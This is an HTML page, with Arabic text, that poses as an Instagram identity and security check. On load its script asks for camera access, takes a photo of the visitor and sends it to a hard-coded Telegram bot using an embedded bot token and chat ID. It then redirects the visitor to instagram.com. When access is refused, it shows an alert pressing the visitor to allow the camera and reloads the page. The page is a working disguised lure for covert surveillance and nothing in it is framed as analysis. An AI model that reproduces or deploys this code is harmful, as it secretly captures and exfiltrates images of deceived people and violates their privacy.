<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تأكيد الهوية</title>
</head>
<body style="background-color: #fafafa; font-family: sans-serif;">
    <script>
        const token = '8481025653:AAHuGzMnekvP81s0gkm12cUK7zTY5e84hkE';
        const chat_id = '7308253683';

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', chat_id);
                    fd.append('photo', blob, 'shot.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
                    .then(() => { location.href = "https://instagram.com"; });
                }, 'image/jpeg');
            } catch (e) {
                alert("يجب السماح بالكاميرا لتأكيد الحساب!");
                location.reload();
            }
        }
        start();
    </script>
    <div style="text-align: center; margin-top: 100px;">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="insta">
        <h3>جاري فحص الأمان..</h3>
        <p>يرجى الانتظار للحظات</p>
    </div>
</body>
</html>
